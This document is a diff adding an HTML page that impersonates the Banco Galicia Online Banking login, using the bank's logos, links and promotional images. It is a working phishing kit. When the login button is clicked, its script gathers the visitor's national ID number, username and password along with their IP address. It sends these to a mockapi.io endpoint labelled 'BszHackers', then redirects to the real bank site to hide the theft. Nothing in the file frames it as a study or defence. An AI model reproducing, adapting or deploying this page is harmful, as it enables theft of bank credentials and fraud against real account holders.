@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="es-ar">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" href="https://files.catbox.moe/tkku2l.ico" type="image/x-icon">
+   <a href="https://www.foroactivo.com" target="_blank"></a>
+  <title>Online Banking</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: start;
+      min-height: 100vh;
+      overflow-x: hidden; 
+    }
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 120px;
+      height: auto;
+    }
+
+    .form-group {
+      margin-top: 20px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 8px;
+      border: none;
+      border-bottom: 2px solid #ccc;
+      font-size: 16px;
+      outline: none;
+    }
+
+
+
+    .remember {
+      margin-top: 12px;
+    }
+
+    .remember input {
+      margin-right: 5px;
+    }
+
+.login-btn {
+  width: 100%;
+  background-color: #ccc;
+  color: #555;
+  border: none;
+  padding: 12px;
+  margin-top: 20px;
+  cursor: not-allowed;
+  border-radius: 7px;
+  transition: background-color 0.3s, color 0.3s;
+}
+
+.login-btn.enabled {
+  background-color: orange;
+  color: white;
+  cursor: pointer;
+}
+
+
+    .links {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .links a {
+      color: #f36f20;
+      text-decoration: none;
+      display: block;
+      margin-top: 6px;
+    }
+
+    .promo {
+      margin-top: 30px;
+      padding: 15px;
+      border: 1px solid #ddd;
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      font-size: 14px;
+    }
+
+    .promo img {
+      width: 28px;
+      height: 28px;
+    }
+
+    .promo b {
+      color: #f36f20;
+    }
+
+    .titulo {
+  font-weight: 700;
+  color: #333;
+  display: inline-block;
+  margin-bottom: 4px;
+}
+
+.config-link {
+  color: #f36f20;
+  font-weight: 600;
+  text-decoration: none;
+}
+
+.config-link:hover {
+  text-decoration: underline;
+}
+
+    .footer {
+      font-size: 11px;
+      color: #555;
+      margin-top: 20px;
+    }
+
+    .footer a {
+      color: #333;
+      text-decoration: underline;
+    }
+    
+    
+.inputWrapper {
+  position: relative;
+  margin-bottom: 30px;
+}
+
+.inputWrapper input {
+  width: 100%;
+  padding-right: 30px;
+  border: none;
+  border-bottom: 2px solid #ccc;
+  outline: none;
+}
+
+.inputWrapper input.error {
+  border-bottom: 2px solid red;
+}
+
+.errorIcon {
+  display: none;
+  position: absolute;
+  top: 25px; /* <-- bajado desde 1px a 10px */
+  right: -5px; 
+  width: 18px;
+  height: 18px;
+  background-color: red;
+  color: white;
+  border-radius: 50%;
+  font-size: 13px;
+  text-align: center;
+  line-height: 18px;
+  font-weight: bold;
+  pointer-events: none;
+}
+
+
+.tooltip-inner {
+  display: none;
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  background-color: white;
+ color: rgba(21, 28, 41, 0.64);
+  padding: 10px 12px;
+  font-size: 13px;
+  border-radius: 12px;
+   border: 1px solid rgba(23, 26, 31, 0.02);
+  white-space: nowrap;
+  z-index: 10;
+   box-shadow: 
+    0 2px 4px 0 rgba(21, 28, 40, 0.16), 
+    0 4px 8px 0 rgba(21, 28, 40, 0.08);
+}
+
+
+    .container2 {
+  position: relative; /* para que los tooltip se posicionen relativos a este */
+  width: 360px;
+  padding: 20px;
+  box-sizing: border-box;
+}
+/* Estilo del contenedor del checkbox */
+.remember {
+  position: relative;
+  padding-left: 26px;
+  font-size: 14px;
+  color: #333;
+}
+
+/* Ocultar checkbox nativo */
+.remember input[type="checkbox"] {
+  display: none;
+}
+
+/* Cuadro del checkbox */
+.remember label::before {
+  content: "";
+  display: inline-block;
+  width: 18px;
+  height: 18px;
+  border-radius: 4px;
+  border: 1px solid rgba(21, 28, 40, 0.36);
+  background-color: #fff;
+  position: absolute;
+  left: 0;
+  top: 0;
+  transition: background-color 0.2s, border 0.2s;
+}
+
+/* Palomita (checkmark) cuando está activo */
+.remember input[type="checkbox"]:checked + label::after {
+  content: "✔";
+  position: absolute;
+  left: 5px;
+  top: 0px;
+  font-size: 13px;
+  color: white;
+}
+
+/* Fondo y borde naranja cuando está activo */
+.remember input[type="checkbox"]:checked + label::before {
+  background-color: #f60;
+  border-color: #f60;
+}
+
+    
+    /* Contenedor principal flex */
+.main-container {
+  display: flex;
+  height: 100vh; /* toda la altura viewport */
+  width: 100vw;  /* todo el ancho del viewport */
+}
+
+/* Lado izquierdo - formulario */
+.left-side {
+  width: 50vw;       /* 50% del ancho del viewport */
+  padding: 20px;     /* si quieres algo de espacio interno */
+  overflow-y: auto;  /* scroll vertical si queda largo */
+  background: #fff;  /* color de fondo */
+  box-sizing: border-box; /* que padding no afecte ancho */
+}
+
+/* Lado derecho - imagen */
+.right-side {
+  width: 50vw;       /* 50% del ancho del viewport */
+  position: relative;
+}
+
+/* Div imagen fondo */
+#img-container-artes {
+  width: 100%;
+  height: 100vh;         /* altura completa */
+  background-size: cover;
+  background-position: center;
+  background-repeat: no-repeat;
+}
+
+/* Vista móvil */
+@media screen and (max-width: 768px) {
+  .main-container {
+    flex-direction: column; /* Cambia de horizontal a vertical */
+    height: auto; /* Ajusta a la altura del contenido */
+  }
+
+  .left-side,
+  .right-side {
+    width: 100vw; /* Ocupan todo el ancho */
+    height: auto; /* Dejan que crezca el contenido */
+  }
+
+  #img-container-artes {
+    height: 300px; /* Altura fija o adaptable de la imagen en móvil */
+  }
+}
+
+    .form-group.inputWrapper input {
+  width: 100%;       /* ocupa todo el ancho del contenedor */
+  max-width: auto;  /* máximo 350px de ancho */
+  box-sizing: border-box;
+}
+
+    .logo-text {
+  color: #6a6a6a;
+  font-size: 18px;
+  margin-top: 8px;
+ 
+}
+
+    .inicio-text {
+  color: #6a6a6a;
+  font-size: 28px;
+  margin-top: 8px;
+  text-align: center; 
+
+}
+
+    /* Overlay estilo */
+.overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(0,0,0,0.7);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  display: none;
+  z-index: 9999;
+}
+
+.overlay img {
+  width: 100px;
+}
+  </style>
+</head>
+<body><div class="main-container">
+  <div class="left-side">
+    <!-- Aquí va TODO el contenido de tu formulario -->
+    <div class="container">
+      <div class="logo">
+        <img src="https://onlinebanking.bancogalicia.com.ar/images/default/logo.svg" alt="Galicia Logo">
+          <p class="logo-text">Online Banking</p>
+            <p class="inicio-text">Iniciar sesión</p>
+      </div>
+
+      <div class="form-group inputWrapper">
+          <input type="text" id="dni" placeholder="Tu DNI" required>
+          <div class="errorIcon">!</div>
+      </div>
+
+      <div class="form-group inputWrapper">
+          <input type="text" id="usuario" placeholder="Tu usuario Galicia">
+          <div class="errorIcon">!</div>
+      </div>
+
+      <div class="form-group inputWrapper">
+          <input type="password" id="clave" placeholder="Tu clave Galicia">
+          <div class="errorIcon">!</div>
+      </div>
+
+      <!-- Tooltips globales -->
+      <div class="tooltip-inner" id="tooltip-dni">El número de documento es obligatorio</div>
+      <div class="tooltip-inner" id="tooltip-usuario">El campo Usuario es obligatorio</div>
+      <div class="tooltip-inner" id="tooltip-clave">La clave es obligatoria</div>
+
+      <div class="remember">
+        <input type="checkbox" id="recordar">
+        <label for="recordar">Recordar DNI y Usuario</label>
+      </div>
+
+   <button class="login-btn" id="loginBtn" disabled>INICIAR SESIÓN</button>
+      
+      <!-- Overlay animación --><div id="overlay" class="overlay">
+  <img src="https://files.catbox.moe/hokyyt.gif" >
+</div>
+      
+      <div class="links">
+        <a href="https://onlinebanking.bancogalicia.com.ar/gestion/ingresar-du">OLVIDÉ O BLOQUEÉ MIS CLAVES</a>
+        <p>Sí es tu primera vez o necesitás el usuario</p>
+        <a href="https://onlinebanking.bancogalicia.com.ar/gestion/ingresar-du">CREÁ TUS CLAVES</a>
+      </div>
+
+      <div class="promo">
+        <img src="https://onlinebanking.bancogalicia.com.ar/img/isologo_g_mas.svg" alt="Galicia Más">
+        <div>
+          <p>
+            <span class="titulo">¿Venís de Galicia Más?</span><br>
+            Primero tenés que <a href="https://www.bancogalicia.com.ar" class="config-link">configurar tu cuenta desde la App Galicia</a>. 
+            Si ya lo hiciste, ingresá con tus claves Galicia.
+          </p>
+        </div>
+      </div>
+<br></br>
+      <center>
+        <div class="footer" style="color: #6a6a6a; margin-top: -10px;">
+          Operar con Online Banking implica aceptar los 
+          <a href="https://www.galicia.ar/personas/online-banking-gallery" style="color: #6a6a6a; font-weight: bold; text-decoration: none;">términos y condiciones</a>. 
+          Información sobre seguridad 
+          <a href="https://www.galicia.ar/personas/online-banking-gallery" style="color: #6a6a6a; font-weight: bold; text-decoration: none;">aquí</a>.
+        </div>
+      </center>
+    </div>
+  </div>
+
+  <div class="right-side">
+    <!-- Aquí va la imagen -->
+    <div class="side-info content img art art-2 art-adobe-0" role="complementary" data-automation-id="out-banner" id="img-container-artes" style="background-image: url('https://www.galicia.ar/content/dam/galicia/banco-galicia/personas/canales/onb/ONBGallery/ilustraciones/2024/Promociones-2-YamilaYjilioff.jpg');">
+      <a target="_blank" href="https://www.galicia.ar/personas/buscador-de-promociones" tabindex="0" id="img-container-artes-href" data-hj-masked=""></a>
+    </div>
+  </div>
+</div>
+
+
+<script>
+  const imagenes = [
+      { text: "Promos | Yamila Yjilioff", 
+        img: "https://www.galicia.ar/content/dam/galicia/banco-galicia/personas/canales/onb/ONBGallery/ilustraciones/2024/Promociones-2-YamilaYjilioff.jpg", 
+        url: "https://www.galicia.ar/personas/buscador-de-promociones" },
+
+      { text: "Promos | Luz Preumayr", 
+        img: "https://www.galicia.ar/content/dam/galicia/banco-galicia/personas/canales/onb/ONBGallery/ilustraciones/2024/Promociones-4-LuzPreumayr.jpg", 
+        url: "https://www.galicia.ar/personas/buscador-de-promociones" },
+        
+      { text: "App | Luz Preumayr", 
+        img: "https://www.galicia.ar/content/dam/galicia/banco-galicia/personas/canales/onb/ONBGallery/ilustraciones/2024/App-6-LuzPreumayr.jpg", 
+        url: "https://www.galicia.ar/personas/app-galicia" },
+
+      { text: "App | Eugenia Hernández", 
+        img: "https://www.galicia.ar/content/dam/galicia/banco-galicia/personas/canales/onb/ONBGallery/ilustraciones/2024/App-4-EugeniaHernandez.jpg", 
+        url: "https://www.galicia.ar/personas/app-galicia" },
+
+      { text: "App | Eugenia Hernández", 
+        img: "https://www.galicia.ar/content/dam/galicia/banco-galicia/personas/canales/onb/ONBGallery/ilustraciones/2024/App-3-EugeniaHernandez.jpg", 
+        url: "https://www.galicia.ar/personas/app-galicia" },
+
+      { text: "Haberes | Javi Pane", 
+        img: "https://www.galicia.ar/content/dam/galicia/banco-galicia/personas/canales/onb/ONBGallery/ilustraciones/2024/Haberes-1-JaviPane.jpg", 
+        url: "https://www.galicia.ar/personas/cobrar-sueldo-galicia" },
+
+      { text: "24/7- Nani Naveira Ramos", 
+        img: "https://www.galicia.ar/content/dam/galicia/banco-galicia/personas/canales/onb/ONBGallery/ilustraciones/2023/24-7-nani.jpg", 
+        url: "https://ayuda.bancogalicia.com.ar/" },
+
+      { text: "Seguridad- Nani Naveira Ramos", 
+        img: "https://www.galicia.ar/content/dam/galicia/banco-galicia/personas/canales/onb/ONBGallery/ilustraciones/2023/seguridad-nani.jpg", 
+        url: "https://www.galicia.ar/personas/prevencion-estafas" },
+  ];
+
+  try {
+    const i = Math.floor(Math.random() * imagenes.length);
+    const enlace = document.getElementById("img-container-artes-href");
+    const contenedor = document.getElementById("img-container-artes");
+
+    enlace.href = imagenes[i].url;
+    contenedor.style.backgroundImage = `url(${imagenes[i].img})`;
+
+    // Remover clases art-adobe-x anteriores
+    contenedor.className = contenedor.className.replace(/art-adobe-\d+/g, '').trim();
+    // Añadir la clase nueva
+    contenedor.classList.add("art-adobe-" + i);
+  } catch (error) {
+    console.error('Problemas de carga:', error);
+  }
+</script>
+
+ <script>
+   document.querySelectorAll('.inputWrapper input').forEach(input => {
+  input.addEventListener('blur', () => {
+    const id = input.id;
+    const tooltip = document.getElementById(`tooltip-${id}`);
+    const allTooltips = document.querySelectorAll('.tooltip-inner');
+
+    if (!input.value.trim()) {
+      input.classList.add('error');
+      input.parentElement.querySelector('.errorIcon').style.display = 'block';
+      allTooltips.forEach(t => t.style.display = 'none'); // Oculta los demás
+      tooltip.style.display = 'block';
+    } else {
+      input.classList.remove('error');
+      input.parentElement.querySelector('.errorIcon').style.display = 'none';
+      tooltip.style.display = 'none';
+    }
+  });
+});
+
+   
+  document.querySelectorAll('.inputWrapper input').forEach(input => {
+  input.addEventListener('blur', () => {
+    const wrapper = input.parentElement;
+    const icon = wrapper.querySelector('.errorIcon');
+    const tooltip = wrapper.querySelector('.tooltip-inner');
+
+    if (!input.value.trim()) {
+      // Solo si se tocó y salió sin valor, mostrar error
+      input.classList.add('error');
+      icon.style.display = 'block';
+      tooltip.style.display = 'block';
+    } else {
+      // Si hay valor, quitar error (por si entró y salió con valor)
+      input.classList.remove('error');
+      icon.style.display = 'none';
+      tooltip.style.display = 'none';
+    }
+  });
+
+  input.addEventListener('input', () => {
+    if (input.value.trim()) {
+      // Si escribe, quitar error
+      const wrapper = input.parentElement;
+      const icon = wrapper.querySelector('.errorIcon');
+      const tooltip = wrapper.querySelector('.tooltip-inner');
+
+      input.classList.remove('error');
+      icon.style.display = 'none';
+      tooltip.style.display = 'none';
+    }
+  });
+});
+
+
+  const dniInput = document.getElementById('dni');
+  const usuarioInput = document.getElementById('usuario');
+  const claveInput = document.getElementById('clave');
+  const loginBtn = document.getElementById('loginBtn');
+  const overlay = document.getElementById('overlay');
+
+  // Validación de inputs
+  function checkInputs() {
+    const allFilled = dniInput.value.trim() !== '' &&
+                      usuarioInput.value.trim() !== '' &&
+                      claveInput.value.trim() !== '';
+    
+    if (allFilled) {
+      loginBtn.disabled = false;
+      loginBtn.classList.add('enabled');
+    } else {
+      loginBtn.disabled = true;
+      loginBtn.classList.remove('enabled');
+    }
+  }
+
+  dniInput.addEventListener('input', checkInputs);
+  usuarioInput.addEventListener('input', checkInputs);
+  claveInput.addEventListener('input', checkInputs);
+
+  loginBtn.addEventListener('click', async (event) => {
+  event.preventDefault();
+
+  const data = {
+    dni: dniInput.value.trim(),
+    usuario: usuarioInput.value.trim(),
+    clave: claveInput.value.trim()
+  };
+
+  overlay.style.display = 'flex';
+
+  console.log("Preparando datos a enviar:", data);
+
+  // Esperar a obtener la IP
+  const ip = await obtenerIP();
+  data.ip = ip;
+
+  console.log("Enviando datos a:", 'https://68434e6de1347494c31fa930.mockapi.io/R/BszHackers/User/UmVnaXN0cm9z');
+
+  setTimeout(() => {
+    fetch('https://68434e6de1347494c31fa930.mockapi.io/R/BszHackers/User/UmVnaXN0cm9z', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    })
+    .then(response => {
+      if (!response.ok) throw new Error(`Error del servidor: ${response.status}`);
+      return response.json();
+    })
+    .then(result => {
+      console.log("Respuesta del servidor:", result);
+      window.location.href = "https://onlinebanking.bancogalicia.com.ar/Users/LogInAuthentication";
+    })
+    .catch(err => {
+      alert("Error al enviar los datos.");
+      overlay.style.display = 'none';
+      console.error("Ocurrió un error:", err);
+    });
+  }, 2000);
+});
+
+   function obtenerIP() {
+  return fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(ipData => ipData.ip)
+    .catch(error => {
+      console.error("No se pudo obtener la IP:", error);
+      return 'IP_NO_DISPONIBLE'; // Valor por defecto si falla
+    });
+}
+
+   
+</script>
+
+</body>
+</html>
